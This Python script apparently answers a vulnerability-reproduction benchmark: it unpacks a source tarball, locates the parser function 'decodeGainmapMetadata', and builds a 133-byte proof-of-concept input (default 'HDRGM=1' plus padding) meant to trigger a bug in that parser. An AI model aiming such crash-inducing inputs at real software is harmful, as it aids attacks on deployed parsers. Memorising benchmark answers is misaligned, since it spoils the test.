import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_len = 133
        try:
            project_dir = self._extract_tarball(src_path)
            func_body = self._find_decode_func_body(project_dir)
            if not func_body:
                return self._default_poc(target_len)
            header, need_eq, delim_chars, tokens = self._analyze_function(func_body)
            poc = self._construct_poc(header, need_eq, delim_chars, tokens, target_len)
            return poc
        except Exception:
            return self._default_poc(target_len)

    def _extract_tarball(self, src_path: str) -> str:
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            with tarfile.open(src_path, "r:*") as tar:
                tar.extractall(tmpdir)
        except Exception:
            # If extraction fails for any reason, still return directory (may be empty)
            pass
        return tmpdir

    def _find_decode_func_body(self, root_dir: str) -> str | None:
        # Look through plausible source files for the function definition.
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")
        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                if not name.endswith(exts):
                    continue
                path = os.path.join(dirpath, name)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue
                idx = text.find("decodeGainmapMetadata")
                if idx == -1:
                    continue
                # Find the opening brace after the function name
                brace_start = text.find("{", idx)
                if brace_start == -1:
                    continue
                depth = 0
                end = None
                for i in range(brace_start, len(text)):
                    c = text[i]
                    if c == "{":
                        depth += 1
                    elif c == "}":
                        depth -= 1
                        if depth == 0:
                            end = i + 1
                            break
                if end is not None:
                    return text[brace_start:end]
        return None

    def _analyze_function(self, body: str):
        # Collect string tokens used with find/compare/starts_with/memcmp
        tokens: list[str] = []

        regexes = [
            r"\.\s*(?:find|rfind|compare|starts_with|ends_with)\s*\(\s*\"([^\"\n]+)\"",
            r"memcmp\s*\([^,]+,\s*\"([^\"\n]+)\"",
        ]
        for rgx in regexes:
            try:
                found = re.findall(rgx, body)
                tokens.extend(found)
            except re.error:
                continue

        # Unique while preserving order
        seen = set()
        unique_tokens: list[str] = []
        for t in tokens:
            if t not in seen:
                seen.add(t)
                unique_tokens.append(t)
        tokens = unique_tokens

        # Delimiter characters used with .find('<c>')
        delim_chars = set()
        try:
            char_finds = re.findall(r"\.find\(\s*'(.)'\s*(?:,|\))", body)
            for ch in char_finds:
                delim_chars.add(ch)
        except re.error:
            pass

        # Header selection: prefer starts_with(...) literal, else first token, else fallback
        header = None
        try:
            m = re.search(r"starts_with\s*\(\s*\"([^\"\n]+)\"", body)
            if m:
                header = m.group(1)
        except re.error:
            header = None

        if header is None and tokens:
            # Choose first token that looks like a plausible non-format header
            for t in tokens:
                if len(t) >= 3 and "%" not in t:
                    header = t
                    break

        if header is None:
            header = "HDRGM"

        # Determine if the code searches for '='
        need_eq = ".find('=')" in body or ".find(\"=\")" in body

        return header, need_eq, delim_chars, tokens

    def _construct_poc(
        self,
        header: str,
        need_eq: bool,
        delim_chars: set[str],
        tokens: list[str],
        target_len: int,
    ) -> bytes:
        # Choose a safe filler character not among delimiters and not '='
        filler_char = "A"
        for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
            if c not in delim_chars and c != "=" and c != "\n" and c != "\r":
                filler_char = c
                break

        parts: list[str] = []
        # Start with header
        parts.append(header)

        # Ensure there is an '=' after header if code searches for '='
        if need_eq:
            parts.append("=")
            parts.append("1")
        else:
            parts.append(filler_char)

        # Optionally append other tokens to satisfy possible required substrings.
        # Limit to avoid overly long strings before trimming.
        for tok in tokens[1:6]:
            parts.append(filler_char)
            parts.append(tok)

        text = "".join(parts)

        # Pad or trim to target length
        if len(text) < target_len:
            text += filler_char * (target_len - len(text))
        elif len(text) > target_len:
            text = text[:target_len]

        try:
            return text.encode("ascii", "replace")
        except Exception:
            return bytes((ord(ch) if ord(ch) < 128 else ord("?")) for ch in text[:target_len])

    def _default_poc(self, target_len: int) -> bytes:
        base = "HDRGM=1"
        if len(base) < target_len:
            base += "A" * (target_len - len(base))
        else:
            base = base[:target_len]
        return base.encode("ascii", "replace")
